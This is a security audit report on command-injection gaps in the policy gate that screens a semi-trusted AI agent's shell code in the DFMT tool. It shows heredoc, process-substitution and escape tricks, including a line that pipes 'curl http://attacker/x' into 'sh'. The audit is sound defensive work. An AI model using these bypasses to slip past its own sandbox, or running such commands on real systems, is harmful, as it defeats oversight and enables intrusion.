# sc-cmdi — OS Command Injection

## Scope

DFMT exposes `dfmt_exec` to a semi-trusted agent. The agent's `req.Code`
is, by design, "agent-supplied shell code" passed to `bash -c` /
`sh -c` (or written to a temp file and executed by the named
interpreter). The relevant question is therefore not "can the agent
inject metacharacters" — it is supposed to — but **whether the policy
gate that stands in front of the shell can be bypassed** by quoting,
escaping, encoding, or operator tricks. Secondary scope: any
`exec.Command` site in the daemon where attacker-influenced input
could reach argv.

## Surfaces examined

- `internal/sandbox/permissions.go` — `Exec`, `splitByShellOperators`,
  `extractBaseCommand`, `hasShellChainOperators`, `globToRegexShell`,
  `buildEnv`, `isSandboxEnvBlocked`, `prependPATH`, `execImpl`.
- `internal/sandbox/runtime.go` — `Probe`, `getVersion`, `lookPath`.
- `internal/sandbox/permissions.go::writeTempFile` (non-shell exec
  path).
- `internal/capture/git.go` — `GitLog`.
- `internal/cli/dispatch.go` — `runStop` (taskkill), `openInBrowser`,
  `spawnDaemon`, child reaper.
- `internal/client/client.go` — daemon auto-spawn.

## Findings

### CMDI-01 — Heredoc body is not policy-checked
- **Severity:** Medium
- **CWE:** CWE-78
- **File:** `internal/sandbox/permissions.go:641` (operator list) and
  `:797` (`splitByShellOperators`).
- **Description:** `hasShellChainOperators` recognises `<<` to mark a
  command as "chain-bearing", which forces the multi-step policy path.
  But `splitByShellOperators` does **not** strip / inspect the heredoc
  body. The base-command and per-part walks treat the text after `<<TAG`
  as continuation of the surrounding pipeline. When the heredoc body
  ends up routed to a shell as commands (e.g. `bash <<'EOF'\n
  payload\nEOF`) the per-part walk never sees `payload` because the
  splitter's only job after splitting on `<` is to keep walking the
  current segment.
- **Attack scenario:** An agent that has the allow-listed `bash` (it
  doesn't currently — but operators commonly add it) or any
  allow-listed shell-fronted runner (e.g. `make` invoking a recipe
  that reads stdin, or `git` with `git -c core.editor=…`) supplies:
  ```
  bash <<EOF
  sudo whoami
  EOF
  ```
  Today the chain check sees `bash`, `EOF` (allow-listed-by-base?),
  `sudo whoami` is **inside the heredoc body and never extracted as a
  part**. Defence-in-depth fail.
- **Evidence:**
  ```
  // hasShellChainOperators
  if strings.Contains(cmd, "<<") { return true }
  // splitByShellOperators only handles &, |, ;, <, > as token separators;
  // it does not parse heredoc syntax (<<TAG ... TAG).
  ```
- **Remediation:** Either extract the heredoc body and recurse the
  splitter on each line as its own command (matching the `$(...)`
  recursion already in place), or hard-deny any `exec` whose code
  contains `<<`. The latter matches the current "deny when in doubt"
  posture for `curl|sh`. The default policy does not allow `bash` /
  `sh` as base commands today, which materially reduces exploitability,
  but operator policies that add `bash *` will trip on this.
- **Confidence:** Medium. Reachable only when a shell-fronted base
  command is allow-listed; in stock config the deny path on `dfmt`
  (recursive) and the absence of `bash` from the allow list contain
  it.

### CMDI-02 — `<<<` here-string and process-substitution `<(...)` / `>(...)` not classified
- **Severity:** Low
- **CWE:** CWE-78
- **File:** `internal/sandbox/permissions.go:641`.
- **Description:** `hasShellChainOperators` checks for `<<` but not
  `<<<` (bash here-string) or process-substitution `<(...)` / `>(...)`.
  These are bash-only and the default runtime is bash on the host.
  `<<<` falls through as `<` + `<` + `<` so chain detection still
  triggers (`<` is in the operator list), but `<(...)` is not split on
  — the inner subprocess runs without per-part allow-list enforcement.
- **Attack scenario:** With an operator-added `bash *` allow rule, a
  command like `cat <(curl http://attacker/x | sh)` parses as a single
  token list. `hasShellChainOperators` returns true (because `|` is
  present inside), but `splitByShellOperators` does not recognise the
  `<(` boundary as a substitution delimiter, so the inner command is
  not isolated as its own part the way `$(...)` and backticks are.
- **Evidence:**
  ```
  // splitByShellOperators recurses into $( ) and ` ` only:
  if c == '$' && i+1 < len(cmd) && cmd[i+1] == '(' { ... }
  if c == '`' { ... }
  // No < ( … ) recursion.
  ```
- **Remediation:** Add `<(`, `>(` to the substitution recursion. As
  with CMDI-01, the default policy's missing `bash` allow rule is the
  primary mitigation today.
- **Confidence:** Medium.

### CMDI-03 — `ApplyShellQuoteCollapseInsideOperators` gap: ANSI-C $'\\x' escapes
- **Severity:** Low
- **CWE:** CWE-78
- **File:** `internal/sandbox/permissions.go:797` (`splitByShellOperators`).
- **Description:** Bash supports ANSI-C quoting `$'…'` which interprets
  hex/octal escapes (e.g. `$'\x73udo'` → `sudo`). The splitter treats
  `$'` as a regular `$` followed by single-quoted text — single-quotes
  are opaque to it, so the inner bytes pass through verbatim. Today
  this does **not** matter because `extractBaseCommand` and the deny
  glob compare the literal byte sequence, so `$'\x73udo' whoami` is
  not matched against `sudo *`. But a future hardening that
  pre-resolves quoted prefixes would need to handle ANSI-C decoding
  too.
- **Attack scenario:** `bash -c "$'\x73udo' whoami"` — only reachable
  if `bash` is allow-listed and the deny rule is byte-anchored. The
  current deny rule `sudo *` is regex-anchored on the literal command
  string, so this is not currently exploitable. Filed as Info /
  belt-and-braces because the comment block above
  `splitByShellOperators` claims "single quotes ('…') are opaque to
  bash — write through" without flagging the `$'…'` variant.
- **Evidence:**
  ```
  // permissions.go:900 — quote handling
  // Single quotes ('…') are opaque to bash — write through.
  // Double quotes ("…") still expand $(…) and `…` substitutions, so the inner
  // commands must be policy-checked the same way as in the unquoted branch
  ```
- **Remediation:** Either decode `$'…'` before deny-rule evaluation,
  or call out the limitation in the comment. Low priority.
- **Confidence:** Low (informational).

### CMDI-04 — Verified safe: GitLog, openInBrowser, signalStopProcess, daemon auto-spawn
- **Severity:** Info
- **File:** `internal/capture/git.go:90`,
  `internal/cli/dispatch.go:1124`, `:1013`, `:2124`,
  `internal/client/client.go:339`.
- **Description:** These call `exec.Command` with literal program
  names and tightly-scoped arguments:
  - `GitLog` — `git log --oneline -n <strconv.Itoa(int)>`. Limit is an
    `int`; `Itoa` produces `[0-9]+` only.
  - `signalStopProcess` — `taskkill /PID <int> /T [/F]`. PID is an
    `int` parsed by `Sscanf("%d")` from `.dfmt/daemon.pid` (which the
    daemon itself writes). Format-string is fixed.
  - `openInBrowser` — URL is constructed by `runDashboard` from
    `http://127.0.0.1:<int>/dashboard`; not user-supplied.
  - `spawnDaemon` / `client.spawnDaemon` — `exePath` from
    `os.Executable()` (kernel-supplied), arguments are constants.
- **Confidence:** High.

### CMDI-05 — Verified safe: non-shell `Exec` (node/python/ruby/etc.)
- **Severity:** Info
- **File:** `internal/sandbox/permissions.go:1815`.
- **Description:** For non-shell langs, `req.Code` is written to a
  `os.CreateTemp("", "dfmt-sandbox-*"+ext)` file and the interpreter
  is invoked as `exec.CommandContext(ctx, rt.Executable, tmpfile)` —
  separate argv, no shell. The temp path itself is randomised by
  CreateTemp; the interpreter itself was resolved by `lookPath` over a
  fixed list of language names. The policy gate runs on `lang + " " +
  code` against the `python *` / `node *` allow rules, so the agent's
  per-language code is at the mercy of that policy regex (e.g.
  `python *` allows any python source — by design).
- **Confidence:** High.

## Summary

Two latent gaps (CMDI-01, CMDI-02) and one cosmetic note (CMDI-03).
None is exploitable in the **default** policy because `bash`/`sh` are
not on the allow list and the deny list catches the dangerous bases.
Operators who add a `bash *` allow rule should be aware of the
heredoc / process-substitution gaps. No untrusted-input path reaches
`exec.Command` outside the sandbox layer.
